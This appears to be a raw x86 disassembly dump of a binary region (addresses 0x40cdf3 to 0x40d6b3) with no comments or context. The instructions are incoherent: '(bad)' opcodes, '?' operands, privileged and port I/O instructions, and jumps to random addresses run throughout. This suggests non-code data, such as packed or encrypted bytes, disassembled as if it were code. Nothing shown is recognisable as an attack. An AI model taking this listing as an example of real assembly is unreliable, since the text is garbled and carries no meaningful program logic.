  40cdf3:	mov    edi,0xc0238d14
  40cdf8:	inc    edx
  40cdf9:	xabort 0x3
  40cdfc:	scas   eax,DWORD PTR es:[edi]
  40cdfd:	lea    ecx,[edi+edx*2-0x7d1ac08f]
  40ce04:	mov    ch,0xd
  40ce06:	cmp    DWORD PTR [esi+ebp*2+0x70bf8629],ebp
  40ce0d:	mov    ebp,0x87ee397d
  40ce12:	in     eax,dx
  40ce13:	mov    esi,0x475e154e
  40ce18:	test   BYTE PTR [ebx+0x30fa0fe3],0xee
  40ce1f:	mov    esi,0x47640946
  40ce24:	add    dl,BYTE PTR [ebp+0x4e]
  40ce27:	cmp    DWORD PTR [edx],eax
  40ce29:	lods   eax,DWORD PTR ds:[esi]
  40ce2a:	pop    edx
  40ce2b:	xor    BYTE PTR [ebp+0x64971b8],ah
  40ce31:	mov    ?,edi
  40ce33:	lock adc DWORD PTR ds:0x57f9e900,eax
  40ce3a:	leave  
  40ce3b:	sub    ebp,esi
  40ce3d:	add    al,0x55
  40ce3f:	jb     0x40ce8b
  40ce41:	add    ebx,0x1d
  40ce44:	adc    DWORD PTR [ecx+0x14],0x4f826
  40ce4b:	jmp    0xf712ba49
	...
  40ce60:	add    BYTE PTR [eax],al
  40ce62:	mov    dl,0x8
  40ce64:	add    ecx,ebp
  40ce66:	stc    
  40ce67:	add    al,0xf
  40ce69:	push   ebp
  40ce6a:	cmp    BYTE PTR [ebx+0x31f9f57c],al
  40ce70:	adc    ebx,esi
  40ce72:	add    dl,BYTE PTR [ecx]
  40ce74:	push   0xffffffea
  40ce76:	jecxz  0x40ce7c
  40ce78:	push   0xffffffe9
  40ce7a:	popa   
  40ce7b:	mov    dh,bh
  40ce7d:	(bad)  
  40ce7e:	lods   eax,DWORD PTR fs:[esi]
  40ce80:	sub    bl,ch
  40ce82:	stc    
  40ce83:	add    al,0x83
  40ce85:	xor    al,0xea
  40ce87:	add    eax,0x314d0a75
  40ce8c:	adc    BYTE PTR [esi-0x5317f33e],ah
  40ce92:	xlat   BYTE PTR ds:[ebx]
  40ce93:	mov    bh,0xfe
  40ce95:	pusha  
  40ce96:	inc    edx
  40ce97:	mov    ecx,0x2b1214fe
  40ce9c:	add    BYTE PTR [ebx],dl
  40ce9e:	repnz mov DWORD PTR [ebp+edi*2+0x49],eax
  40cea3:	lods   eax,DWORD PTR ds:[esi]
  40cea4:	data16 jbe 0x40ce3b
  40cea7:	mov    dh,0xe8
  40cea9:	jmp    0x6a40d3a9
  40ceae:	cmp    cl,BYTE PTR [ecx]
  40ceb0:	add    dl,ah
  40ceb2:	fdiv   DWORD PTR [esi+0x3074f974]
  40ceb8:	or     BYTE PTR [ecx-0x1c],al
  40cebb:	push   ds
  40cebc:	inc    DWORD PTR [eax]
  40cebe:	cmp    al,0x89
  40cec0:	inc    ebx
  40cec1:	cld    
  40cec2:	fdiv   st(4),st
  40cec4:	adc    ebp,DWORD PTR [edx+0x0]
	...
  40ced7:	add    BYTE PTR [ebx+0x568d03ed],ah
  40cedd:	ja     0x40cf2d
  40cedf:	call   0x3e4581
  40cee4:	jmp    0x7b82:0x63ffffce
  40ceeb:	or     al,0x60
  40ceed:	cld    
  40ceee:	pop    ds
  40ceef:	jmp    esi
  40cef1:	adc    ebp,DWORD PTR [edx+0x3]
  40cef4:	pop    esp
  40cef5:	out    dx,eax
  40cef6:	pop    es
  40cef7:	call   0x3fb0c3
  40cefc:	pop    esp
  40cefd:	out    dx,eax
  40cefe:	adc    ebp,DWORD PTR [edx+0x50]
  40cf01:	in     eax,dx
  40cf02:	jmp    FWORD PTR [ecx+0x53]
  40cf05:	imul   edx,DWORD PTR [esi],0xffffffff
  40cf08:	dec    esp
  40cf09:	jns    0x40cef2
  40cf0b:	mov    cl,0x22
  40cf0d:	add    eax,DWORD PTR [eax]
  40cf0f:	cmp    DWORD PTR [esi-0xf8afbec],0x79
  40cf16:	jae    0x40cf28
  40cf18:	dec    esp
  40cf19:	out    dx,eax
  40cf1a:	pop    es
  40cf1b:	call   0x3fae7f
  40cf20:	mov    bh,BYTE PTR [edi]
  40cf22:	cld    
  40cf23:	jmp    esi
  40cf25:	sbb    al,0x6a
  40cf27:	add    cl,bh
  40cf29:	or     al,0x8d
  40cf2b:	inc    ebp
  40cf2c:	jg     0x40cf7f
  40cf2e:	call   0xfdb94d22
  40cf33:	jmp    0x40d1a3
  40cf38:	pusha  
  40cf39:	test   BYTE PTR [ebx],0x5
	...
  40cf4c:	add    BYTE PTR [eax],al
  40cf4e:	(bad)  
  40cf4f:	adc    edi,edi
  40cf51:	jne    0x40cf16
  40cf53:	in     al,dx
  40cf54:	add    eax,0xe80aa6ff
  40cf59:	push   ebp
  40cf5a:	cli    
  40cf5b:	lds    edi,FWORD PTR [ebx+0x2ad72fe]
  40cf61:	add    dl,bh
  40cf63:	push   esp
  40cf64:	sub    DWORD PTR [ecx],eax
  40cf66:	cli    
  40cf67:	stos   DWORD PTR es:[edi],eax
  40cf68:	jg     0x40cfe6
  40cf6a:	push   es
  40cf6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf6c:	xor    eax,0x12718d20
  40cf71:	push   0xfffffff2
  40cf73:	fidiv  WORD PTR [esi]
  40cf75:	or     BYTE PTR [edx+0x75ff24a4],dl
  40cf7b:	getsec 
  40cf7d:	adc    al,0xe0
  40cf7f:	stos   BYTE PTR es:[edi],al
  40cf80:	sub    BYTE PTR [eax],al
  40cf82:	shr    BYTE PTR [ebx-0x48a35456],1
  40cf88:	mov    ebx,0x2acbfe8
  40cf8d:	add    BYTE PTR [ecx+0x29],bh
  40cf90:	sysret 
  40cf92:	iret   
  40cf93:	or     edi,DWORD PTR [ebp+0xc51ea74]
  40cf99:	jmp    FWORD PTR [edi-0x6bee555d]
  40cf9f:	(bad)  
  40cfa0:	mov    ebx,0x28d7affe
  40cfa5:	add    edx,DWORD PTR [eax+0x220028ab]
  40cfab:	es mov ebp,0x1bc50dfe
  40cfb1:	add    DWORD PTR [eax],eax
	...
  40cfc3:	add    dl,bh
  40cfc5:	stos   DWORD PTR es:[edi],eax
  40cfc6:	jg     0x40d044
  40cfc8:	out    dx,al
  40cfc9:	mov    bl,0x35
  40cfcb:	sbb    al,0xbd
  40cfcd:	call   0xac2ecf91
  40cfd2:	add    bh,bh
  40cfd4:	outs   dx,DWORD PTR ds:[esi]
  40cfd5:	fsubr  DWORD PTR [eax]
  40cfd7:	add    BYTE PTR [eax-0x60],dl
  40cfda:	lea    eax,[esi+edx*8+0x1b]
  40cfde:	lods   al,BYTE PTR ds:[esi]
  40cfdf:	arpl   sp,cx
  40cfe1:	es mov esp,0xe904c7e8
  40cfe7:	add    edi,edx
  40cfe9:	sbb    ebx,0xf530030f
  40cfef:	les    esi,FWORD PTR [esi]
  40cff1:	mov    ecx,0x4fa03e7
  40cff6:	inc    esi
  40cff7:	ss push es
  40cff9:	sub    ebp,ecx
  40cffb:	sub    esi,edi
  40cffd:	xchg   DWORD PTR [ebx-0x5552c241],ebp
  40d003:	mov    ebp,0xd80fb584
  40d008:	jge    0x40cfbf
  40d00a:	call   0xe349c68f
  40d00f:	add    BYTE PTR ss:[ebp-0x18],bh
  40d013:	add    edi,edx
  40d015:	add    al,0x10
  40d017:	enter  0xb55d,0xe8
  40d01b:	adc    dh,0x8
  40d01e:	loop   0x40d056
  40d020:	add    BYTE PTR [ebp-0x18],bh
  40d023:	add    edi,edx
  40d025:	add    al,0xd0
  40d027:	jg     0x40d029
	...
  40d039:	add    BYTE PTR ds:0xb686e8b5,bh
  40d03f:	or     ch,ah
  40d041:	xor    eax,0x30bb09c7
  40d046:	retf   
  40d047:	add    DWORD PTR [ebx+0x8],0xfffffffa
  40d04b:	add    al,0x29
  40d04d:	add    cl,BYTE PTR [ecx-0x1ce49b4]
  40d053:	test   DWORD PTR [ebx],esp
  40d055:	mov    al,0x78
  40d057:	daa    
  40d058:	popf   
  40d059:	or     BYTE PTR [ebx],ch
  40d05b:	daa    
  40d05c:	xchg   ebp,eax
  40d05d:	mov    ebx,0x8680b96e
  40d062:	arpl   WORD PTR [ebp+ecx*4-0x7a52c173],si
  40d069:	xor    DWORD PTR [edx],ecx
  40d06b:	mov    ah,0xf3
  40d06d:	scas   eax,DWORD PTR es:[edi]
  40d06e:	aam    0x3a
  40d070:	add    BYTE PTR [ecx-0x6f],dh
  40d073:	cmp    DWORD PTR [eax],ecx
  40d075:	or     DWORD PTR [ebx+0x28],0x398166ff
  40d07c:	adc    al,0xd3
  40d07e:	push   DWORD PTR [ebx+0x39715d74]
  40d084:	clc    
  40d085:	inc    ecx
  40d086:	iret   
  40d087:	mov    cl,0xfe
  40d089:	inc    esi
  40d08a:	popa   
  40d08b:	cmp    eax,edi
  40d08d:	push   ecx
  40d08e:	xchg   ecx,eax
  40d08f:	push   ds
  40d090:	push   DWORD PTR [esi]
  40d092:	push   cs
  40d093:	add    eax,0x9ff9e900
  40d098:	pop    edi
  40d099:	push   0xffffffc3
  40d09b:	add    BYTE PTR ds:0x9b,cl
	...
  40d0ad:	add    BYTE PTR [eax],al
  40d0af:	add    dl,cl
  40d0b1:	call   ecx
  40d0b3:	pushf  
  40d0b4:	mov    BYTE PTR [ebp+0x4f9dd7c],0x40
  40d0bb:	out    dx,eax
  40d0bc:	and    al,0x3d
  40d0be:	push   DWORD PTR [ebp+edi*8-0x7d]
  40d0c2:	inc    esp
  40d0c3:	std    
  40d0c4:	je     0x40d0e7
  40d0c6:	hlt    
  40d0c7:	fsubr  QWORD PTR [esi]
  40d0c9:	and    esp,esi
  40d0cb:	out    0xa,al
  40d0cd:	mov    ecx,0xb3e406e7
  40d0d2:	(bad)  
  40d0d3:	pusha  
  40d0d4:	mov    edx,0xe54feac
  40d0d9:	mov    ah,0x74
  40d0db:	mov    ebp,0xbef83960
  40d0e0:	retf   0xe7fc
  40d0e3:	adc    ebx,edx
  40d0e5:	mov    bl,0xfe
  40d0e7:	scas   al,BYTE PTR es:[edi]
  40d0e8:	retf   0x6a18
  40d0eb:	call   0x9f350a30
  40d0f0:	sub    ch,BYTE PTR [ebp-0x4d4ce019]
  40d0f6:	dec    BYTE PTR [esi+0xe7ad2a]
  40d0fc:	outs   dx,DWORD PTR ds:[esi]
  40d0fd:	loopne 0x40d0fd
  40d0ff:	(bad)  
  40d100:	cmp    ecx,DWORD PTR [ecx]
  40d102:	add    BYTE PTR [eax],al
  40d104:	jecxz  0x40d168
  40d106:	add    edi,DWORD PTR [eax+0x7d3]
  40d10c:	or     cl,dl
  40d10e:	push   cs
  40d10f:	add    BYTE PTR [esi-0x7e],ch
  40d112:	jmp    0x0:0x56
	...
  40d125:	add    BYTE PTR [eax],ah
  40d127:	in     eax,dx
  40d128:	pop    es
  40d129:	add    dh,cl
  40d12b:	add    al,0x5e
  40d12d:	leave  
  40d12e:	shl    DWORD PTR [ebx-0xb17502],1
  40d134:	jmp    0xbab9:0xe6b5c40a
  40d13b:	outs   dx,BYTE PTR ds:[esi]
  40d13c:	std    
  40d13d:	or     ebp,0xffffffb3
  40d140:	cmp    DWORD PTR [esi],0xfff0f463
  40d146:	mov    ?,edi
  40d148:	out    0xa9,eax
  40d14a:	jp     0x40d1ba
  40d14c:	std    
  40d14d:	pop    esi
  40d14e:	sub    cl,dl
  40d150:	add    al,BYTE PTR [eax]
  40d152:	outs   dx,BYTE PTR ds:[esi]
  40d153:	sub    dl,0x8b
  40d156:	sahf   
  40d157:	dec    DWORD PTR [edx+0x2822755]
  40d15d:	nop
  40d15e:	sar    bl,1
  40d160:	str    edi
  40d163:	add    eax,0x6c33558b
  40d168:	cs (bad) 
  40d16a:	adc    DWORD PTR [eax-0x1ceceb85],ecx
  40d170:	pop    es
  40d171:	mov    ebp,esi
  40d173:	adc    al,0xff
  40d175:	jo     0x40d196
  40d177:	jl     0x40d179
  40d179:	adc    esi,0x10
  40d17c:	add    BYTE PTR [edx+ecx*1-0x80],dh
  40d180:	push   ebx
  40d181:	sbb    BYTE PTR [ebx],dh
  40d183:	jl     0x40d185
  40d185:	cmp    edx,0xffffff9d
  40d188:	or     cl,cl
	...
  40d19a:	add    BYTE PTR [eax],al
  40d19c:	mov    eax,0x715502b8
  40d1a1:	cwde   
  40d1a2:	test   bl,al
  40d1a4:	mov    dh,0x1b
  40d1a6:	push   edx
  40d1a7:	mov    esi,DWORD PTR [edi]
  40d1a9:	int3   
  40d1aa:	mov    edi,0x29cc5ff
  40d1af:	add    BYTE PTR [ecx+0x61],dh
  40d1b2:	push   es
  40d1b3:	(bad)  
  40d1b4:	cli    
  40d1b5:	fwait
  40d1b6:	add    al,BYTE PTR [eax]
  40d1b8:	cli    
  40d1b9:	push   ds
  40d1ba:	aaa    
  40d1bb:	or     dl,bh
  40d1bd:	fmul   DWORD PTR [edx]
  40d1bf:	sub    edi,DWORD PTR [edx-0x4736a896]
  40d1c5:	mov    al,ds:0xa407ff02
  40d1ca:	stos   BYTE PTR es:[edi],al
  40d1cb:	call   FWORD PTR [edx]
  40d1cd:	jecxz  0x40d187
  40d1cf:	or     bh,BYTE PTR [edx+0x3a2b0a91]
  40d1d5:	jb     0x40d22e
  40d1d7:	leave  
  40d1d8:	cmp    BYTE PTR [eax+0x13bf8902],ch
  40d1de:	mov    ecx,0xe13f274
  40d1e3:	arpl   WORD PTR [ebp-0x4d],dx
  40d1e6:	mov    edi,0x29d4644
  40d1eb:	add    dl,bh
  40d1ed:	push   eax
  40d1ee:	aas    
  40d1ef:	in     al,dx
  40d1f0:	stos   BYTE PTR es:[edi],al
  40d1f1:	cmp    BYTE PTR [esi],bh
  40d1f3:	hlt    
  40d1f4:	retf   0x2dd2
  40d1f7:	or     BYTE PTR [edx],ah
  40d1f9:	jae    0x40d1b7
  40d1fb:	(bad)  
  40d1fc:	and    eax,0xec3f15
	...
  40d211:	add    BYTE PTR [ebp+0xe7c83b5],ah
  40d217:	pushf  
  40d218:	cs add al,0x1
  40d21b:	mov    gs,WORD PTR [esi]
  40d21d:	or     cl,dl
  40d21f:	pop    ebx
  40d220:	pop    eax
  40d221:	pop    edi
  40d222:	xor    eax,DWORD PTR ds:0xddfa07ab
  40d228:	and    ebp,DWORD PTR [eax-0x7d7eb87e]
  40d22e:	popfw  
  40d230:	call   0xff456c38
  40d235:	or     esp,DWORD PTR [ecx]
  40d237:	lds    ebx,FWORD PTR [esi]
  40d239:	pop    ecx
  40d23a:	ret    
  40d23b:	(bad)  
  40d23c:	in     al,0x3
  40d23e:	jno    0x40d287
  40d240:	add    edx,0xabb9069d
  40d246:	mov    ds:0x82b85e1c,al
  40d24b:	inc    edi
  40d24c:	push   ebp
  40d24d:	mov    WORD PTR [ebp-0x62605c37],gs
  40d253:	mov    cl,0xe8
  40d255:	add    esp,DWORD PTR [ecx-0x75c1940b]
  40d25b:	push   esp
  40d25c:	fs mov ss,WORD PTR ds:[esi+ebp*1+0x2e]
  40d262:	repnz pushf 
  40d264:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d265:	mov    ebp,0x4671b174
  40d26a:	push   0xffffffed
  40d26c:	mov    ds:0xe208ecab,eax
  40d271:	aad    0xe9
  40d273:	adc    al,0x6
  40d275:	add    BYTE PTR cs:[eax],al
	...
  40d288:	push   esi
  40d289:	pushf  
  40d28a:	dec    eax
  40d28b:	sub    ecx,DWORD PTR [ebp-0x4f]
  40d28e:	rol    ebx,0xa7
  40d291:	push   ecx
  40d292:	and    ch,al
  40d294:	icebp  
  40d295:	add    al,0x10
  40d297:	dec    ecx
  40d298:	and    dh,BYTE PTR [ecx-0x7a9f5fdd]
  40d29e:	push   ebx
  40d29f:	lods   al,BYTE PTR ds:[esi]
  40d2a0:	and    eax,0x9e82e737
  40d2a5:	mov    eax,0x853b30e8
  40d2aa:	cmp    ebp,DWORD PTR [ebp+ecx*1+0x78ef0038]
  40d2b1:	xor    ah,dh
  40d2b3:	jmp    0x1d3fe782
  40d2b8:	mov    dl,0xa8
  40d2ba:	jo     0x40d2cd
  40d2bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2bd:	scas   eax,DWORD PTR es:[edi]
  40d2be:	sub    ch,BYTE PTR [ecx-0x5436afb4]
  40d2c4:	repnz add al,0x83
  40d2c7:	add    al,0x9a
  40d2c9:	mov    al,0x73
  40d2cb:	in     al,0x9e
  40d2cd:	jnp    0x40d2ce
  40d2cf:	call   0xd9854ecd
  40d2d4:	test   BYTE PTR [ecx],bh
  40d2d6:	in     al,0x76
  40d2d8:	(bad)  
  40d2d9:	jnp    0x40d31f
  40d2db:	inc    ebp
  40d2dc:	mov    bh,0xd0
  40d2de:	add    DWORD PTR [ecx+0x4e682551],edi
  40d2e4:	gs jge 0x40d32b
  40d2e7:	and    eax,0x72dc3181
	...
  40d2fc:	add    BYTE PTR [eax],al
  40d2fe:	retf   
  40d2ff:	mov    al,0xea
  40d301:	xchg   ecx,eax
  40d302:	adc    bh,BYTE PTR [ebx-0x31]
  40d305:	cmp    esp,DWORD PTR es:[ebp+0x4f9e8ff]
  40d30c:	lea    esp,[ecx+ebx*4-0x6a5372c0]
  40d313:	inc    eax
  40d314:	push   edx
  40d315:	push   cs
  40d316:	sub    edi,ebp
  40d318:	out    0x16,eax
  40d31a:	xchg   ecx,eax
  40d31b:	scas   eax,DWORD PTR es:[edi]
  40d31c:	(bad)  
  40d31d:	repnz cmp DWORD PTR [esp+ecx*1],esi
  40d321:	push   0x3
  40d323:	mov    ecx,0x833f74ff
  40d328:	jl     0x40d2f3
  40d32a:	stc    
  40d32b:	cmp    DWORD PTR [esi],esp
  40d32d:	push   0xfffffff2
  40d32f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d330:	call   FWORD PTR [esi+esi*8-0x51]
  40d334:	je     0x40d2ff
  40d336:	push   ecx
  40d337:	or     ch,BYTE PTR [eax+0x0]
  40d33a:	cmp    al,0x77
  40d33c:	std    
  40d33d:	jne    0x40d3ae
  40d33f:	pop    esp
  40d340:	sub    dh,bh
  40d342:	dec    esp
  40d343:	ja     0x40d342
  40d345:	jne    0x40d396
  40d347:	pop    esp
  40d348:	hlt    
  40d349:	addr16 pushf 
  40d34b:	jbe    0x40d376
  40d34d:	shr    BYTE PTR ds:0xdfc2c958,0x3
  40d354:	mov    eax,DWORD PTR [ebp+0x73]
  40d357:	sbb    bh,dh
  40d359:	dec    ebp
  40d35a:	xchg   DWORD PTR [edx-0x201c1b85],eax
  40d360:	add    eax,0x83
	...
  40d371:	add    BYTE PTR [eax],al
  40d373:	add    dh,cl
  40d375:	pop    edi
  40d376:	(bad)  
  40d377:	je     0x40d3a8
  40d379:	jnp    0x40d3be
  40d37b:	or     al,0x1c
  40d37d:	cmc    
  40d37e:	fisttp DWORD PTR [edi-0x38c895d]
  40d384:	cmp    edi,DWORD PTR [ebx+0x2c2cff65]
  40d38a:	add    BYTE PTR [eax],al
  40d38c:	mov    ds:0xca5f5e03,eax
  40d391:	lds    ecx,FWORD PTR [edx]
  40d393:	add    BYTE PTR [esi+0x7a],ah
  40d396:	jmp    0x9e83:0x55bbd783
  40d39d:	adc    eax,DWORD PTR [eax]
  40d39f:	jne    0x40d40a
  40d3a1:	sub    eax,DWORD PTR [eax]
  40d3a3:	add    BYTE PTR [ebx+0x3],dl
  40d3a6:	pop    edi
  40d3a7:	leave  
  40d3a8:	adc    DWORD PTR [eax],eax
  40d3aa:	add    bh,bh
  40d3ac:	mov    ss,WORD PTR [ebx]
  40d3ae:	sub    edx,edx
  40d3b0:	enter  0x1044,0xf7
  40d3b4:	ss jg  0x40d41b
  40d3b7:	inc    ecx
  40d3b8:	push   ebx
  40d3b9:	add    BYTE PTR [ebx-0x10],0xc9
  40d3bd:	or     bh,bh
  40d3bf:	jne    0x40d414
  40d3c1:	jns    0x40d436
  40d3c3:	or     dl,bh
  40d3c5:	lds    ebx,FWORD PTR [ecx]
  40d3c7:	pop    edi
  40d3c8:	sbb    eax,0xea7c80be
  40d3cd:	popf   
  40d3ce:	sub    eax,0x289ca00c
  40d3d3:	fs add eax,0xe80bf0
	...
  40d3e9:	add    dl,dh
  40d3eb:	(bad)  
  40d3ec:	mov    ah,0xfe
  40d3ee:	cmc    
  40d3ef:	adc    DWORD PTR [eax],edx
  40d3f1:	jmp    DWORD PTR [edi-0x4c]
  40d3f4:	stos   BYTE PTR es:[edi],al
  40d3f5:	dec    edx
  40d3f6:	pop    eax
  40d3f7:	xchg   edi,eax
  40d3f8:	mov    ah,0x88
  40d3fa:	aaa    
  40d3fb:	xor    BYTE PTR [esp+esi*2+0x82e86ee],0xe2
  40d403:	int3   
  40d404:	and    bh,bh
  40d406:	lds    esi,FWORD PTR [edi]
  40d408:	das    
  40d409:	adc    al,0xbd
  40d40b:	mov    ecx,0xb9ffe80a
  40d410:	mov    bl,0xfe
  40d412:	sub    DWORD PTR [ecx-0x46],0xfffffffe
  40d416:	das    
  40d417:	mov    al,0xb3
  40d419:	je     0x40d40d
  40d41b:	inc    ebx
  40d41c:	lods   eax,DWORD PTR ds:[esi]
  40d41d:	pusha  
  40d41e:	xchg   ebp,eax
  40d41f:	inc    edi
  40d420:	mov    ch,0x74
  40d422:	out    0xee,al
  40d424:	or     BYTE PTR cs:[edx+0x7dff20d5],dl
  40d42b:	and    edi,DWORD PTR [edi]
  40d42d:	adc    al,0x79
  40d42f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d430:	add    dh,BYTE PTR [esi+edi*8+0x1a]
  40d434:	aaa    
  40d435:	cld    
  40d436:	test   DWORD PTR [edi-0x207cfb],0xd2fd73fe
  40d440:	ret    0x435e
  40d443:	fimul  DWORD PTR [edi]
  40d445:	add    BYTE PTR [ebx-0x5bee1b0],bl
  40d44b:	or     al,0xac
  40d44d:	cmp    BYTE PTR [eax],al
	...
  40d45f:	add    BYTE PTR [edi-0xad21efc],bh
  40d465:	fldcw  WORD PTR [eax-0x33cccac]
  40d46b:	add    edi,DWORD PTR [ecx+0x30]
  40d46e:	int    0xfe
  40d470:	mov    ?,esi
  40d472:	lds    ebp,FWORD PTR [esi]
  40d474:	out    0xad,al
  40d476:	xor    ecx,DWORD PTR [edx+edx*1]
  40d479:	test   BYTE PTR [edi-0x4b],al
  40d47c:	cld    
  40d47d:	jnp    0x40d4a2
  40d47f:	int3   
  40d480:	pop    ebp
  40d481:	add    eax,0x9cfa02e9
  40d486:	in     eax,0x1c
  40d488:	in     eax,0xad
  40d48a:	pop    edi
  40d48b:	ds out 0xd9,al
  40d48e:	lea    ebp,[eax+0xffbadeb]
  40d494:	int    0x37
  40d496:	icebp  
  40d497:	stos   DWORD PTR es:[edi],eax
  40d498:	ja     0x40d4bd
  40d49a:	jbe    0x40d450
  40d49c:	jo     0x40d4f5
  40d49e:	jne    0x40d42a
  40d4a0:	stc    
  40d4a1:	push   0xffffffad
  40d4a3:	clc    
  40d4a4:	lods   eax,DWORD PTR cs:[esi]
  40d4a6:	fisubr DWORD PTR [edx-0x7f02b890]
  40d4ac:	in     eax,0x4
  40d4ae:	aam    0x4
  40d4b0:	xchg   ebp,eax
  40d4b1:	aaa    
  40d4b2:	cmp    eax,0x3e26bbab
  40d4b7:	mov    ah,0xd0
  40d4b9:	les    edx,FWORD PTR [ebp-0x16e74436]
  40d4bf:	xor    dh,0xb0
  40d4c2:	jmp    0x40d4c8
	...
  40d4d4:	add    BYTE PTR [eax],al
  40d4d6:	ja     0x40d53d
  40d4d8:	call   0x161acee0
  40d4dd:	test   al,0xcf
  40d4df:	jns    0x40d494
  40d4e1:	scas   eax,DWORD PTR es:[edi]
  40d4e2:	or     BYTE PTR [eax],0x43
  40d4e5:	add    BYTE PTR [edi-0x55fc6d4c],dh
  40d4eb:	lods   eax,DWORD PTR ds:[esi]
  40d4ec:	(bad)  
  40d4ed:	jnp    0x40d4e0
  40d4ef:	pushf  
  40d4f0:	daa    
  40d4f1:	(bad)  
  40d4f2:	outs   dx,BYTE PTR ds:[esi]
  40d4f3:	scas   al,BYTE PTR es:[edi]
  40d4f4:	(bad)  
  40d4f5:	pop    esp
  40d4f6:	adc    ch,BYTE PTR [esi+0x1381f174]
  40d4fc:	popa   
  40d4fd:	(bad)  
  40d4fe:	imul   edi,DWORD PTR [esp+eax*2-0x63],0x3cff04f4
  40d506:	repnz lods eax,DWORD PTR ds:[esi]
  40d508:	je     0x40d4fb
  40d50a:	popa   
  40d50b:	cmp    al,0xf8
  40d50d:	mov    dh,0x49
  40d50f:	jp     0x40d55d
  40d511:	aad    0x7c
  40d513:	in     eax,dx
  40d514:	call   FWORD PTR [ebx]
  40d516:	stc    
  40d517:	stos   DWORD PTR es:[edi],eax
  40d518:	je     0x40d4af
  40d51a:	xchg   BYTE PTR [edx],bl
  40d51c:	xchg   si,ax
  40d51e:	test   eax,0x972ebfdf
  40d523:	(bad)  
  40d524:	adc    ebp,ecx
  40d526:	mov    BYTE PTR [ecx],dh
  40d528:	sbb    BYTE PTR [esi+0x3],bh
  40d52b:	adc    edi,edi
  40d52d:	cld    
  40d52e:	jge    0x40d4db
  40d530:	je     0x40d50f
  40d532:	push   0x85510831
  40d537:	stos   BYTE PTR es:[edi],al
  40d538:	(bad)  
  40d539:	pop    esi
	...
  40d54a:	add    BYTE PTR [eax],al
  40d54c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d54d:	ins    BYTE PTR es:[edi],dx
  40d54e:	je     0x40d536
  40d550:	push   0x4141f431
  40d555:	and    edi,edi
  40d557:	inc    esi
  40d558:	lods   eax,DWORD PTR ds:[esi]
  40d559:	ins    BYTE PTR es:[edi],dx
  40d55a:	pop    esi
  40d55b:	xor    BYTE PTR [eax+ebx*1+0x298cae00],bh
  40d562:	clc    
  40d563:	mov    ebx,0x174ab7a
  40d568:	test   eax,0x231e1431
  40d56d:	mov    ebp,0xab5d9cfe
  40d572:	je     0x40d555
  40d574:	jno    0x40d598
  40d576:	inc    BYTE PTR [eax]
  40d578:	hlt    
  40d579:	ja     0x40d584
  40d57b:	rcl    BYTE PTR [ebp+edi*2+0x50],0x1
  40d580:	push   ebx
  40d581:	or     bh,bh
  40d583:	jne    0x40d5b4
  40d585:	nop
  40d586:	adc    al,0x66
  40d588:	adc    al,0x77
  40d58a:	sub    eax,eax
  40d58c:	in     al,0x69
  40d58e:	rcl    BYTE PTR [ebx+edx*1],0x89
  40d592:	cmp    al,0x1
  40d594:	and    ecx,DWORD PTR [eax]
  40d596:	cmp    DWORD PTR [ebp+0x37],0x5
  40d59a:	jne    0x40d6af
  40d5a0:	clc    
  40d5a1:	ja     0x40d58a
  40d5a3:	and    al,0xe2
  40d5a5:	pop    es
  40d5a6:	add    BYTE PTR [ebx+0x4896d2e],cl
  40d5ac:	pop    ecx
  40d5ad:	add    eax,DWORD PTR [ebp-0x10]
	...
  40d5c0:	add    BYTE PTR [eax],al
  40d5c2:	stc    
  40d5c3:	add    BYTE PTR [eax-0x1],dl
  40d5c6:	out    dx,al
  40d5c7:	test   al,0xe6
  40d5c9:	je     0x40d5e1
  40d5cb:	js     0x40d5ca
  40d5cd:	push   0xffffffd3
  40d5cf:	jbe    0x40d644
  40d5d1:	adc    al,0x44
  40d5d3:	in     eax,dx
  40d5d4:	pop    es
  40d5d5:	call   0x3e451a
  40d5da:	sub    BYTE PTR [ebp+0x14],al
  40d5dd:	sbb    edx,0x0
  40d5e0:	jne    0x40d5f1
  40d5e2:	inc    esp
  40d5e3:	in     eax,dx
  40d5e4:	repz call 0x3fb2c5
  40d5ea:	call   0xd20a33af
  40d5ef:	adc    eax,DWORD PTR [eax]
  40d5f1:	or     esp,ecx
  40d5f3:	repz add al,0xe9
  40d5f6:	aaa    
  40d5f7:	or     BYTE PTR [eax],al
  40d5f9:	add    dl,ch
  40d5fb:	cmp    al,0xec
  40d5fd:	push   0x53
  40d5ff:	jbe    0x40d674
  40d601:	adc    al,0xfa
  40d603:	adc    bh,BYTE PTR [eax]
  40d605:	or     BYTE PTR [edx-0x72],ah
  40d608:	mov    ecx,0x40364dfe
  40d60d:	adc    al,0x79
  40d60f:	les    eax,FWORD PTR [edx]
  40d611:	jne    0x40d600
  40d613:	mov    dl,0x36
  40d615:	hlt    
  40d616:	and    dl,BYTE PTR [ebp+0x28]
  40d619:	jmp    FWORD PTR ds:0x335ec416
  40d61f:	pop    edi
  40d620:	pop    ss
  40d621:	add    BYTE PTR ds:0x659808,bl
	...
  40d637:	add    BYTE PTR [ebx+0x22447f9d],bh
  40d63d:	ss inc edi
  40d63f:	call   0xc140abbd
  40d644:	sbb    bl,BYTE PTR [eax+0x5bb3d1db]
  40d64a:	add    eax,DWORD PTR [eax]
  40d64c:	cli    
  40d64d:	mov    dh,BYTE PTR [edx+0x79b3d282]
  40d653:	inc    esp
  40d654:	ficomp DWORD PTR [edi]
  40d656:	pop    ds
  40d657:	call   0xec87fd75
  40d65c:	adc    ecx,ebx
  40d65e:	fwait
  40d65f:	jbe    0x40d659
  40d661:	xchg   esi,eax
  40d662:	fisubr DWORD PTR [edx]
  40d664:	test   al,0x27
  40d666:	inc    edi
  40d667:	in     al,dx
  40d668:	loope  0x40d64a
  40d66a:	mov    ds:0x85543f8a,eax
  40d66f:	rcr    cl,0x1e
  40d672:	fwait
  40d673:	add    esp,DWORD PTR [ebp-0x65aafab3]
  40d679:	and    eax,0x5981e457
  40d67e:	call   0x7105:0x35403f3a
  40d685:	pop    ecx
  40d686:	mov    ds:0x4726f9ea,al
  40d68b:	in     al,0x6d
  40d68d:	add    eax,0x3065179c
  40d692:	or     eax,0xe1305d54
  40d697:	fwait
  40d698:	call   0x0:0xb10db2
	...
  40d6af:	lds    edi,FWORD PTR [ebx+0x0]
  40d6b2:	inc    ebp
  40d6b3:	xor    ch,dh
